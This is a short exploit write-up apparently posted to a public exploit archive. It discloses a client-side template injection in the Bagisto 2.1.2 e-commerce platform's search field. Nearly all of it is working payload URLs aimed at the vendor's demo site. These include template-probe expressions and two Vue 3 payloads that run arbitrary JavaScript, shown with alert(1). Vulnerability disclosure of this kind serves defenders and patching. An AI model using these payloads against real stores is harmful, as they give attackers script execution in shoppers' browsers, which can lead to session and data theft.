# Exploit Title: Bagisto 2.1.2 Client-Side Template Injection (CSTI)
**Date**: 06/18/2024  
**Exploit Author**: tmrswrr  
**Vendor Homepage**: [Bagisto Forums](https://forums.bagisto.com/)  
**Version**: 2.1.2  
**Tested on**: [Bagisto Demo](https://demo.bagisto.com/)

## Proof of Concept (PoC)

1. Navigate to the search functionality on Bagisto:

    ```
    https://demo.bagisto.com/bagisto-common/search?query={{7*7}}
    ```
    **Result**: 49

    ```
    https://demo.bagisto.com/bagisto-common/search?query={{'a'.toUpperCase()}}
    ```
    **Result**: A

    ```
    https://demo.bagisto.com/bagisto/search?query={{ Object.keys(this) }}
    ```
    **Result**: [ "_", "onSubmit", "onInvalidSubmit", "lazyImages", "animateBoxes" ]

2. Payloads for VueJS 3:

    ```
    https://demo.bagisto.com/bagisto/search?query={{_openBlock.constructor('alert(1)')()}}
    ```
    ```
    https://demo.bagisto.com/bagisto/search?query={{-function(){this.alert(1)}()}}
    ```

    **Result**: You will see an alert box.
